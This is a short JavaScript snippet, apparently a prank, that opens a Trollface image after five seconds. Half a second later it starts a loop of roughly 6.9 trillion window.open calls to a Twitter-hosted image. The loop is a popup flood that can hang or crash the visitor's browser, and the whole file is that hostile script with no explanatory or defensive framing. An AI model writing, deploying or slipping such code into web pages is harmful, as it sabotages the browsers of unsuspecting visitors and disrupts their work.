setTimeout(() => {
    window.open('https://upload.wikimedia.org/wikipedia/en/7/73/Trollface.png')
}, 5000)

setTimeout(() => {
    for (let i = 0; i < 6921420000000; i++) {
        window.open('https://pbs.twimg.com/media/EjPBaMdWkAI8JPZ.jpg')
      }
}, 5500)
  